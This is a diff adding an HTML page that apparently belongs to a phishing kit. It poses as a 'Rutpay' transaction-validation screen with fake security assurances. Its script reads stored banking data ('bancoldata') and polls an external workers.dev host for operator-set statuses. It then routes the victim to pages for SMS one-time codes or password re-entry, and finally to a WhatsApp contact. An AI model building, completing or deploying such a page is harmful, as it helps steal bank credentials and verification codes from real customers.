@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Validando - Rutpay</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+      overflow: hidden;
+    }
+
+    .phone {
+      max-width: 430px;
+      width: 100%;
+      min-height: 100vh;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 30px;
+      position: relative;
+    }
+
+    /* Header */
+    .header {
+      width: 100%;
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 20px;
+    }
+
+    .back {
+      position: absolute;
+      left: 18px;
+      font-size: 46px;
+      color: #3b3b3b;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .header h2 {
+      font-size: 26px;
+      font-weight: 500;
+      color: #222;
+    }
+
+    /* Logo Rutpay */
+    .logo {
+      margin-bottom: 30px;
+      margin-top: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo-icon {
+      width: 50px;
+      height: 50px;
+      background: #5B2EFF;
+      border-radius: 12px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .logo-icon svg {
+      width: 32px;
+      height: 32px;
+      fill: #ffffff;
+    }
+
+    .logo-text {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1f2023;
+    }
+
+    .logo-text span {
+      color: #5B2EFF;
+    }
+
+    /* Loading Container */
+    .loading-container {
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    /* Spinner estilo Rutpay */
+    .spinner-container {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 30px;
+    }
+
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 4px solid rgba(91, 46, 255, 0.1);
+      border-top: 4px solid #5B2EFF;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Puntos animados */
+    .dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px 0 30px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #5B2EFF;
+      opacity: 0.3;
+      animation: dotPulse 1.4s ease-in-out infinite both;
+    }
+
+    .dot:nth-child(1) { animation-delay: -0.32s; }
+    .dot:nth-child(2) { animation-delay: -0.16s; }
+    .dot:nth-child(3) { animation-delay: 0s; }
+
+    @keyframes dotPulse {
+      0%, 80%, 100% {
+        transform: scale(0.6);
+        opacity: 0.3;
+      }
+      40% {
+        transform: scale(1);
+        opacity: 0.8;
+      }
+    }
+
+    /* Títulos */
+    .loading-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1f2023;
+      margin-bottom: 12px;
+    }
+
+    .loading-subtitle {
+      font-size: 15px;
+      color: #888;
+      line-height: 1.6;
+      margin-bottom: 5px;
+    }
+
+    .loading-subtitle:last-of-type {
+      margin-bottom: 20px;
+    }
+
+    /* Progress Bar */
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #e8e8e8;
+      border-radius: 2px;
+      margin: 25px 0 30px;
+      overflow: hidden;
+    }
+
+    .progress {
+      width: 0%;
+      height: 100%;
+      background: #5B2EFF;
+      border-radius: 2px;
+      animation: progress 3s ease-in-out infinite;
+    }
+
+    @keyframes progress {
+      0% { width: 0%; }
+      50% { width: 70%; }
+      100% { width: 100%; }
+    }
+
+    /* Security Info */
+    .security-info {
+      background: #f8f9fa;
+      padding: 18px 20px;
+      border-radius: 12px;
+      margin-top: 10px;
+      border-left: 4px solid #5B2EFF;
+      text-align: left;
+    }
+
+    .security-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1f2023;
+      margin-bottom: 6px;
+    }
+
+    .security-text {
+      font-size: 13px;
+      color: #888;
+      line-height: 1.5;
+    }
+
+    /* Footer */
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #bbb;
+      text-align: center;
+    }
+
+    /* Responsive */
+    @media (max-width: 430px) {
+      .phone {
+        padding: 30px 24px;
+      }
+
+      .loading-title {
+        font-size: 22px;
+      }
+
+      .loading-subtitle {
+        font-size: 14px;
+      }
+
+      .spinner {
+        width: 60px;
+        height: 60px;
+      }
+
+      .spinner-container {
+        width: 60px;
+        height: 60px;
+      }
+
+      .header h2 {
+        font-size: 22px;
+      }
+
+      .back {
+        font-size: 38px;
+        left: 14px;
+      }
+
+      .logo-text {
+        font-size: 24px;
+      }
+
+      .logo-icon {
+        width: 42px;
+        height: 42px;
+      }
+
+      .logo-icon svg {
+        width: 26px;
+        height: 26px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .phone {
+        padding: 20px 18px;
+      }
+
+      .loading-title {
+        font-size: 20px;
+      }
+
+      .loading-subtitle {
+        font-size: 13px;
+      }
+
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border-width: 3px;
+      }
+
+      .spinner-container {
+        width: 50px;
+        height: 50px;
+      }
+
+      .header h2 {
+        font-size: 20px;
+      }
+
+      .back {
+        font-size: 32px;
+        left: 12px;
+      }
+
+      .security-info {
+        padding: 14px 16px;
+      }
+
+      .security-title {
+        font-size: 13px;
+      }
+
+      .security-text {
+        font-size: 12px;
+      }
+
+      .logo-text {
+        font-size: 20px;
+      }
+
+      .logo-icon {
+        width: 36px;
+        height: 36px;
+        border-radius: 10px;
+      }
+
+      .logo-icon svg {
+        width: 22px;
+        height: 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="phone">
+    <!-- Header -->
+    <div class="header">
+      <div class="back" onclick="window.history.back()">&#8249;</div>
+      <h2>Validando</h2>
+    </div>
+
+    <!-- Logo Rutpay -->
+    <div class="logo">
+      <div class="logo-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+        </svg>
+      </div>
+      <div class="logo-text">Rut<span>pay</span></div>
+    </div>
+
+    <!-- Loading Container -->
+    <div class="loading-container">
+      
+      <!-- Spinner -->
+      <div class="spinner-container">
+        <div class="spinner"></div>
+      </div>
+
+      <!-- Puntos -->
+      <div class="dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+
+      <!-- Títulos -->
+      <h1 class="loading-title" id="pageTitle">Validando tu información</h1>
+      
+      <p class="loading-subtitle" id="pageSubtitle">Estamos procesando tu solicitud de manera segura</p>
+      <p class="loading-subtitle">Por favor, no cierres esta ventana</p>
+
+      <!-- Progress Bar -->
+      <div class="progress-bar">
+        <div class="progress"></div>
+      </div>
+
+      <!-- Security Info -->
+      <div class="security-info">
+        <div class="security-title">🔒 Transacción Segura</div>
+        <p class="security-text">Tu información está protegida con los más altos estándares de seguridad. Este proceso puede tomar unos segundos.</p>
+      </div>
+
+      <!-- Footer -->
+      <div class="footer">
+        Rutpay - Tu seguridad es nuestra prioridad
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+      // ============================================
+      // OBTENER DATOS DE localStorage
+      // ============================================
+      let bancoldata;
+      try {
+        bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+      } catch (e) {
+        console.error('Error al leer localStorage:', e);
+        bancoldata = null;
+      }
+      
+      // Verificar si hay datos necesarios
+      if (!bancoldata || !bancoldata.transactionId) {
+        console.error("❌ Faltan datos de transacción");
+        alert("Error: Faltan datos de autenticación");
+        window.location.href = 'index.html';
+        return;
+      }
+
+      // ============================================
+      // VARIABLES
+      // ============================================
+      const transactionId = bancoldata.transactionId;
+      const usuario = bancoldata.usuario || 'Usuario';
+      const tipo = bancoldata.tipo || 'login';
+      
+      console.log('🔄 Iniciando validación de transacción:', transactionId);
+      console.log('📦 Datos completos:', bancoldata);
+      console.log('👤 Usuario:', usuario);
+      console.log('📋 Tipo:', tipo);
+      
+      // Variable para controlar si ya se redirigió
+      let redirigido = false;
+      let intentos = 0;
+      const MAX_INTENTOS = 30; // 30 intentos = ~60 segundos
+
+      // ============================================
+      // FUNCIÓN PARA ACTUALIZAR TEXTO EN PANTALLA
+      // ============================================
+      function updateStatus(text, subtitle) {
+        const titleEl = document.getElementById('pageTitle');
+        const subtitleEl = document.getElementById('pageSubtitle');
+        if (titleEl) titleEl.textContent = text;
+        if (subtitleEl && subtitle) subtitleEl.textContent = subtitle;
+      }
+
+      // ============================================
+      // FUNCIÓN PRINCIPAL - CHECK STATUS
+      // ============================================
+      const checkStatus = async () => {
+        try {
+          // Verificar que todavía no se haya redirigido
+          if (redirigido) return;
+          
+          intentos++;
+          console.log(`📡 Consultando estado (intento ${intentos}/${MAX_INTENTOS}) para transactionId:`, transactionId);
+          
+          // Actualizar mensaje en pantalla
+          if (intentos % 5 === 0) {
+            updateStatus(
+              'Validando tu información', 
+              `Verificando identidad (intento ${intentos})`
+            );
+          }
+          
+          const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${transactionId}`);
+          
+          if (!res.ok) {
+            console.error('❌ Error en la respuesta del servidor:', res.status);
+            if (intentos < MAX_INTENTOS) {
+              setTimeout(checkStatus, 2000);
+            } else {
+              alert('Tiempo de espera agotado. Por favor, intenta nuevamente.');
+              window.location.href = 'index.html';
+            }
+            return;
+          }
+          
+          const data = await res.json();
+          console.log('✅ Respuesta del estado:', data);
+
+          // Si no hay estado o está pendiente, seguir esperando
+          if (!data.estado || data.estado === "pendiente") {
+            console.log('⏳ Estado pendiente, esperando...');
+            if (intentos < MAX_INTENTOS) {
+              setTimeout(checkStatus, 2000);
+            } else {
+              alert('Tiempo de espera agotado. Por favor, intenta nuevamente.');
+              window.location.href = 'index.html';
+            }
+            return;
+          }
+
+          // Marcar que ya se va a redirigir
+          redirigido = true;
+
+          // ============================================
+          // REDIRECCIONES SEGÚN ESTADO
+          // ============================================
+          console.log('🔄 Redirigiendo a:', data.estado);
+          
+          switch(data.estado) {
+            case "autorizado":
+              console.log('✅ Transacción autorizada');
+              window.location.href = "codigo.html";
+              break;
+              
+            case "error":
+              console.log('❌ Error en la transacción');
+              alert('Error en la transacción. Serás redirigido al inicio.');
+              window.location.href = "index.html";
+              break;
+              
+            case "otp":
+              console.log('📱 Modo OTP detectado - Redirigiendo a código SMS');
+              // Guardar modo OTP
+              bancoldata.modo = 'otp';
+              localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+              window.location.href = "codigo-sms.html";
+              break;
+              
+            case "fallo":
+              console.log('⚠️ Fallo en la transacción');
+              window.location.href = "rpass.html";
+              break;
+              
+            case "finalizado":
+              console.log('✅ Transacción finalizada');
+              window.location.href = "https://wa.me/573024652105?text=Necesito%20informaci%C3%B3n%20de%20solicitud%20de%20tarjeta%20de%20cr%C3%A9dito";
+              break;
+              
+            default:
+              console.log('⚠️ Estado desconocido:', data.estado);
+              redirigido = false; // Permitir reintentar
+              if (intentos < MAX_INTENTOS) {
+                setTimeout(checkStatus, 2000);
+              } else {
+                alert('Estado desconocido. Por favor, intenta nuevamente.');
+                window.location.href = 'index.html';
+              }
+          }
+
+        } catch (err) {
+          console.error("❌ Error comprobando estado:", err);
+          // Si hay error de red, reintentar después de 3 segundos
+          if (!redirigido && intentos < MAX_INTENTOS) {
+            updateStatus(
+              'Error de conexión', 
+              'Reintentando en 3 segundos...'
+            );
+            setTimeout(checkStatus, 3000);
+          } else if (intentos >= MAX_INTENTOS) {
+            alert('Error de conexión. Por favor, intenta nuevamente.');
+            window.location.href = 'index.html';
+          }
+        }
+      };
+
+      // ============================================
+      // INICIAR POLLING
+      // ============================================
+      // Mostrar mensaje inicial personalizado según el tipo
+      if (tipo === 'sms') {
+        updateStatus(
+          '',
+          'Validando'
+        );
+      } else if (tipo === 'login') {
+        updateStatus(
+          'Validando tu información',
+          'Verificando tus credenciales de acceso'
+        );
+      }
+      
+      // Iniciar el polling después de 2 segundos
+      console.log('⏰ Iniciando polling en 2 segundos...');
+      setTimeout(checkStatus, 2000);
+    });
+  </script>
+
+</body>
+</html>
